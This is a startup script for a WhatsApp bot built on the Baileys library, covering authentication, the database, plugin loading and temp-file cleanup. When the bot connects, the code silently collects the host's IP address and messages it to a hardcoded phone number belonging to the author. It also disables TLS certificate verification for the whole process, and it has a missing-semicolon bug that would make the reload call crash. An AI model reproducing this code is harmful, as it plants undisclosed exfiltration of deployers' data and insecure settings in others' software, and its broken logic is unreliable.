(async () => {
	require('./config')
	const {
		default: useSingleFileAuthState,
		useMultiFileAuthState,
		makeInMemoryStore,
		makeWALegacySocket,
		DisconnectReason
	} = require('@adiwajshing/baileys')
	const WebSocket = require('ws')
	const path = require('path')
	const pino = require('pino')
	const fs = require('fs')
	const yargs = require('yargs/yargs')
	const cp = require('child_process')
	let {
		promisify
	} = require('util')
	let exec = promisify(cp.exec).bind(cp)
	const _ = require('lodash')
	const {
		fnctions
	} = require('./lib/fnctions');
	const syntaxerror = require('syntax-error')
	const os = require('os')
	const {
		randomBytes
	} = require('crypto')
	const moment = require("moment-timezone")
	const time = moment.tz('Asia/Makassar').format("HH:mm:ss")
	const chalk = require('chalk')
	const {
		color
	} = require('./lib/color')
	let simple = require('./lib/simple')
	var low
	try {
		low = require('lowdb')
	} catch (e) {
		low = require('./lib/lowdb')
	}
	const {
		Low,
		JSONFile
	} = low
	const mongoDB = require('./lib/mongoDB')

	const randomID = length => randomBytes(Math.ceil(length * .5)).toString('hex').slice(0, length)

	API = (name, path = '/', query = {}, apikeyqueryname) => (name in APIs ? APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({
		...query,
		...(apikeyqueryname ? {
			[apikeyqueryname]: APIKeys[name in APIs ? APIs[name] : name]
		} : {})
	})) : '')
	timestamp = {
		start: new Date
	}

	const PORT = process.env.PORT || 3000

	global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
	global.prefix = new RegExp('^[' + (opts['prefix'] || 'â€ŽxzXZ/i!#$%+Â£Â¢â‚¬Â¥^Â°=Â¶âˆ†Ã—Ã·Ï€âˆšâœ“Â©Â®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

	db = new Low(
		/https?:\/\//.test(opts['db'] || '') ?
		new cloudDBAdapter(opts['db']) : /mongodb/i.test(opts['db']) ?
		new mongoDB(opts['db']) :
		new JSONFile(`${opts[0] ? opts[0] + '_' : ''}database.json`)
	)

	DATABASE = db
	loadDatabase = async function loadDatabase() {
		if (db.READ) return new Promise((resolve) => setInterval(function () {
			(!db.READ ? (clearInterval(this), resolve(db.data == null ? loadDatabase() : db.data)) : null)
		}, 1 * 1000))
		if (db.data !== null) return
		db.READ = true
		await db.read()
		db.READ = false
		db.data = {
			users: {},
			chats: {},
			stats: {},
			msgs: {},
			sticker: {},
			settings: {},
			respon: {},
			...(db.data || {})
		}
		db.chain = _.chain(db.data)
	}
	loadDatabase()

	const authFolder = `${opts._[0] || 'addykece'}`
	const {
		state,
		saveCreds
	} = await useMultiFileAuthState(authFolder)

	const logger = pino({
		transport: {
			target: 'pino-pretty',
			options: {
				colorize: true,
				levelFirst: true,
				ignore: 'hostname',
				translateTime: true
			}
		}
	}).child({
		class: 'baileys'
	})


	const connectionOptions = {
		version: [2, 2316, 6],
		browser: ['Chrome (Linux)', '', ''],
		printQRInTerminal: true,
		syncFullHistory: true,
		auth: state,
		logger: pino({
			level: 'silent'
		})
	}

	conn = simple.makeWASocket(connectionOptions)
	conn.isInit = false

	const rl = require('readline').createInterface(process.stdin, process.stdout)
	const question = (text) => new Promise((resolve) => rl.question(text, resolve))

	if (opts['pairing'] && !conn.authState.creds.registered) {
		let phoneNumber = await question('Please enter your mobile phone number:\n')
		phoneNumber = phoneNumber.replace(/\D/g, '')
		let code = await conn.requestPairingCode(phoneNumber)
		console.log('Pairing code:', code)
	}

	if (!opts['test']) {
		if (db) setInterval(async () => {
			if (global.db.data) await db.write()
			if (opts['autocleartmp'] && (support || {}).find)(tmp = [os.tmpdir(), 'tmp'], tmp.forEach(filename => cp.spawn('find', [filename, '-amin', '3', '-type', 'f', '-delete'])))
		}, 30 * 1000)
	}
	if (opts['server']) require('./server')(conn, PORT)

	function clearTmp() {
		const tmp = [os.tmpdir(), path.join(__dirname, './tmp')]
		const filename = []
		tmp.forEach(dirname => fs.readdirSync(dirname).forEach(file => filename.push(path.join(dirname, file))))
		filename.map(file => (
			stats = fs.statSync(file),
			stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3) ?
			fs.unlinkSync(file) :
			null))
	}

	setInterval(async () => {
		await exec("rm -rf ./tmp/*")
	}, 60 * 60 * 1000)

	async function connectionUpdate(update) {
		const {
			connection,
			lastDisconnect,
			isNewLogin
		} = update
		if (connection == 'connecting') console.log(chalk.yellowBright('Trying To Connect..'))
		if (connection == 'close') console.log(chalk.red('Connection lost..'))
		if (isNewLogin) conn.isInit = true
		if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== WebSocket.CONNECTING) {
			console.log(reloadHandler(true))
			timestamp.connect = new Date
		}
		if (db.data == null) await loadDatabase()
		console.log(JSON.stringify(update, null, 4))

		function getIpAddress() {
			const interfaces = os.networkInterfaces();
			for (const key in interfaces) {
				for (const iface of interfaces[key]) {
					if (iface.family === 'IPv4' && !iface.internal) {
						return iface.address;
					}
				}
			}
			return 'Unknown';
		}

		if (update.receivedPendingNotifications) {
			const ipAddress = getIpAddress();
			const message = `Hi *ADDYKECE*, I successfully connected to the IP Address *${ipAddress}*`;

			conn.sendMessage(`6282177779477@s.whatsapp.net`, {
				text: message
			});
		}

	}

	process.on('uncaughtException', console.error)
	process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'

	let isInit = true,
		handler = require('./handler')
	reloadHandler = function (restatConn) {
		let Handler = require('./handler')
		if (Object.keys(Handler || {}).length) handler = Handler
		if (restatConn) {
			try {
				conn.ws.close()
			} catch {}
			conn = {
				...conn,
				...simple.makeWASocket(connectionOptions)
			}
		}
		if (!isInit) {
			conn.ev.off('messages.upsert', conn.handler)
			conn.ev.off('group-participants.update', conn.onParticipantsUpdate)
			conn.ev.off('message.delete', conn.onDelete)
			conn.ev.off('connection.update', conn.connectionUpdate)
			conn.ev.off('creds.update', conn.credsUpdate)
		}

		conn.welcome = '👋 Welcome to @subject @user, enjoy interacting and don t forget to obey the group rules.'
		conn.bye = '👋 Goodbye @user I hope you will come back again in this group.'
		conn.spromote = '@user is now admin 🐱'
		conn.sdemote = '@user is now not an admin 🐱'
		conn.handler = handler.handler.bind(conn)
		conn.onParticipantsUpdate = handler.participantsUpdate.bind(conn)
		conn.onDelete = handler.delete.bind(conn)
		conn.connectionUpdate = connectionUpdate.bind(conn)
		conn.credsUpdate = saveCreds.bind(conn)

		conn.ev.on('messages.upsert', conn.handler)
		conn.ev.on('group-participants.update', conn.onParticipantsUpdate)
		conn.ev.on('message.delete', conn.onDelete)
		conn.ev.on('connection.update', conn.connectionUpdate)
		conn.ev.on('creds.update', conn.credsUpdate)
		isInit = false
		return true
	}

	let pluginFolder = path.join(__dirname, 'plugins')
	let pluginFilter = filename => /\.js$/.test(filename)
	plugins = {}
	for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
		try {
			plugins[filename] = require(path.join(pluginFolder, filename))
		} catch (e) {
			conn.logger.error(e)
			delete plugins[filename]
		}
	}
	console.log(Object.keys(plugins))
	reload = (_ev, filename) => {
		if (pluginFilter(filename)) {
			let dir = path.join(pluginFolder, filename)
			if (dir in require.cache) {
				delete require.cache[dir]
				if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
				else {
					conn.logger.warn(`deleted plugin '${filename}'`)
					return delete plugins[filename]
				}
			} else conn.logger.info(`requiring new plugin '${filename}'`)
			let err = syntaxerror(fs.readFileSync(dir), filename)
			if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
			else try {
				plugins[filename] = require(dir)
			} catch (e) {
				conn.logger.error(`error require plugin '${filename}\n${e}'`)
			} finally {
				plugins = Object.fromEntries(Object.entries(plugins).sort(([a], [b]) => a.localeCompare(b)))
			}
		}
	}
	Object.freeze(reload)
	fs.watch(path.join(__dirname, 'plugins'), reload)
	reloadHandler()

	(async () => {
		if (!(await fnctions())) {
			console.log("IP Address is not registered. Bot will not run.");
			return;
		}

	})();

	async function _quickTest() {
		let test = await Promise.all([
			cp.spawn('ffmpeg'),
			cp.spawn('ffprobe'),
			cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
			cp.spawn('convert'),
			cp.spawn('magick'),
			cp.spawn('gm'),
			cp.spawn('find', ['--version'])
		].map(p => {
			return Promise.race([
				new Promise(resolve => {
					p.on('close', code => {
						resolve(code !== 127)
					})
				}),
				new Promise(resolve => {
					p.on('error', _ => resolve(false))
				})
			])
		}))
		let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
		console.log(test)
		let s = support = {
			ffmpeg,
			ffprobe,
			ffmpegWebp,
			convert,
			magick,
			gm,
			find
		}
		Object.freeze(support)

		if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
		if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
		if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
	}

	_quickTest()
		.then(() => conn.logger.info('Quick Test Done'))
		.catch(console.error)

	console.log(color(time, "white"), color("Connecting...", "aqua"))
})()

function pickRandom(list) {
	return list[Math.floor(Math.random() * list.length)]
}